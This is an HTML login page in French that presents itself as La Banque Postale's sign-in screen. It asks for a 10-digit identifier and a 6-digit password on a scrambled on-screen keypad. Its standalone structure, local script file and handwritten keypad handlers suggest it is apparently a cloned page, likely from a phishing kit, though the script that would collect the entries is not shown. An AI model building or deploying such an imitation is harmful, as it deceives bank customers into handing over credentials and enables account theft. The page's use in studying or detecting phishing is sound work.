
<html class="no-js" lang="fr">

<head>
    <meta charset="UTF-8">
    <title>Connexion - La Banque Postale</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
    <meta name="format-detection" content="telephone=no">

    <meta name="theme-color" content="#0b234d">
    <link rel="stylesheet" href="assets/css/style.css">
    <script defer src="assets/js/login.js"></script>

</head>

<body data-image="logo" data-tb-animate="actif" class="tb-user-connected" cz-shortcut-listen="true">
    <div class="flex-container--column --nowrap tb-wrapper-main --gglassmorphing">
        <main class="flex-container--column --nowrap flex-item-fluid overflow-y back-color-trans txt-color-black pa-16 " role="main">

            <div id="form-xo-1" name="formAccesCompte">

                <div id="hidden">
                    <input type="hidden" name="urlbackend" value="%2Fvoscomptes%2FcanalXHTML%2Fidentif.ea%3Forigin%3Dparticuliers">
                    <input type="hidden" name="origin" value="particuliers">
                    <input type="hidden" name="cv" value="true">
                    <input type="hidden" name="cvvs" value="">
                    <input type="hidden" id="iscd" name="iscdName" value="ppcf7886295691fe255aff98bf57092e7c3a4c66ae1689719798">
                    <input type="hidden" id="clt" name="cltName" value="1">
                </div>

                <!-- ECRAN -->
                <div class="ecran font-normal" id="ecran">
                    <!-- Identifiant -->
                    <div data-tb-form-field="" data-tb-form-id="identifiant" class="flex-container w100">

                        <label for="identifiant" class="font-x-medium txt-color-6 mb0">Identifiant à 10 chiffres</label>
                        <div class="flex-container w100 mtts">
                            <div class="tb-container-cvdId w100 --reset flex-item-fluid flex-container-column --injected">
                                <div class="relative flex-center flex-item-fluid">
                                    <input type="text" class="hide-focus --ready --describedby" id="identifiant" inputmode="numeric" pattern="[\*0-9]*" autocomplete="username" maxlength="10" aria-required="true" accessreset="Effacer la saisie de l'identifiant" name="username" style="direction: ltr;">
                                    <span class="souligne" aria-hidden="true">——————————</span>
                                </div>
                                <button onclick="clearInputs()" class="flex-item-center flex-container flex-align-center flex-center --reset" type="button" data-lien-user="actif"><span data-icon="tb-reset" aria-hidden="true"></span><span class="visually-hidden access-text">Effacer la saisie de l'identifiant</span></button>
                            </div>
                        </div>
                        <div data-tb-form-message="" class="flex-container flex-item-last">
                            <div data-icon="tb-erreur" aria-hidden="true" class="--size16px mrts mts"></div>
                            <p data-ad-messages="identifiant" class="flex-container--column flex-item-fluid mts mb0 is-hidden" hidden="hidden">
                                <span data-ad-message="RG001" id="identifiant-RG001" class="is-hidden" hidden="hidden">Veuillez renseigner votre identifiant.</span>
                                <span data-ad-message="RG002" id="identifiant-RG002" class="is-hidden" hidden="hidden">Votre identifiant est incomplet.</span>
                            </p>
                        </div>
                    </div>

                    <!-- Case Ã&nbsp; cocher -->
                    <div class="flex-container w100 mts">
                        <input id="check" name="check-1" type="checkbox" class="tb-checkbox --animate">
                        <label for="check" class="flex-item-fluid">
                            <span class="flex-container--row">
                                <span class="tb-check" aria-hidden="true" tabindex="-1">
                                    <svg width="11px" height="8px" viewBox="0 0 12 9" aria-hidden="true" focusable="false">
                                        <polyline points="1 5 4 8 11 1"></polyline>
                                    </svg>
                                    <span class="tb-mask-svg"></span>
                                </span>
                                <span class="font-x-normal txt-color-black tb-memoriser">Mémoriser mon identifiant (facultatif)</span>
                            </span>
                        </label>
                    </div>

                    <!-- Bouton continuer -->
                    <div id="btnContinuer" class="mtgl u-txt-center">
                        <button id="continue" class="tb-btn-p --tiny w100" data-lien-user="actif">Continuer</button>
                    </div>

                    <!-- Volet Mot de passe -->
                    <div class="w100 hidden" id="passwordzone">

                        <!-- Mot de passe -->
                        <div data-tb-form-field="" data-tb-form-id="motdepasse" class="flex-container w100 mtgl">
                            <div data-tb-cvd-label="" role="heading" aria-level="3" id="label-password" tabindex="-1" class="font-x-medium txt-color-6 mb0" data-tb-cvd-alert="N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons suivants pour saisir votre mot de passe">
                                <span aria-hidden="true">Mot de passe à 6 chiffres sur ce clavier</span>
                                <span class="visually-hidden">Utilisez les boutons suivants pour saisir votre Mot de passe à 6 chiffres sur ce clavier</span>
                            </div>
                            <div class="tb-container-cvdPsw w100 mtts --reset --injected">
                                <div class="relative flex-center flex-item-fluid">
                                    <input type="text" id="password" name="password" maxlength="6" hidden="" class="--ready">
                                    <span class="puces" aria-hidden="true">
                                        <span class="puce"></span>
                                        <span class="puce"></span>
                                        <span class="puce"></span>
                                        <span class="puce"></span>
                                        <span class="puce"></span>
                                        <span class="puce"></span>
                                    </span>
                                </div>
                                <div data-tb-aria="" aria-atomic="true" class="visually-hidden access-text" aria-live="polite">
                                    <p>5 chiffres saisis sur 6</p>
                                </div>
                                <button onclick="clearPassBoxDots()" class="flex-item-center flex-container flex-align-center flex-center --reset" id="reset-password" type="button" data-lien-user="actif">
                                    <span data-icon="tb-reset" aria-hidden="true"></span>
                                    <span class="visually-hidden access-text">Effacer la saisie du mot de passe</span>
                                </button>
                            </div>
                            <div data-tb-form-message="" class="flex-container">
                                <div data-icon="tb-erreur" aria-hidden="true" class="--size16px mrts mts"></div>
                                <div role="heading" aria-level="4" id="motdepasse" tabindex="-1" data-ad-messages="motdepasse" class="flex-container--column flex-item-fluid mts mb0 no-aria-describedby is-hidden --describedby" hidden="hidden">
                                    <span data-ad-message="RG001" id="motdepasse-RG001" class="is-hidden" hidden="hidden">Veuillez renseigner votre mot de passe.</span>
                                    <span data-ad-message="RG002" id="motdepasse-RG002" class="is-hidden" hidden="hidden">
                                        <span aria-hidden="true">Votre mot de passe est incomplet.</span>
                                        <span class="visually-hidden access-text">Votre mot de passe est incomplet</span>
                                    </span>
                                </div>

                            </div>
                            <div class="flex-container flex-item-center flex-align-center flex-center w100 mtts" data-tb-cvd-id="password">
                                <div data-tb-cvd-keys="" class="flex-container flex-space-between">
                                    <button type="button" onclick="keyboard(8)" data-tb-index="0">8</button>
                                    <button type="button" onclick="keyboard(1)" data-tb-index="1">1</button>
                                    <button type="button" onclick="keyboard(2)" data-tb-index="2">2</button>
                                    <button type="button" onclick="keyboard(4)" data-tb-index="3">4</button>
                                    <button type="button" onclick="keyboard(0)" data-tb-index="4">0</button>
                                    <button type="button" onclick="keyboard(3)" data-tb-index="5">3</button>
                                    <button type="button" onclick="keyboard(6)" data-tb-index="6">6</button>
                                    <button type="button" onclick="keyboard(5)" data-tb-index="7">5</button>
                                    <button type="button" onclick="keyboard(9)" data-tb-index="8">9</button>
                                    <button type="button" onclick="keyboard(7)" data-tb-index="9">7</button>

                                </div>
                            </div>

                        </div>
                        <div class="mtgl u-txt-center">
                            <button data-tb-cvd-valider="" id="btnConnexion" class="tb-btn-p w100" type="submit" data-lien-user="actif" data-tb-cvd-alert="N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons précédents pour saisir votre mot de passe">Se connecter</button>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</body>

</html>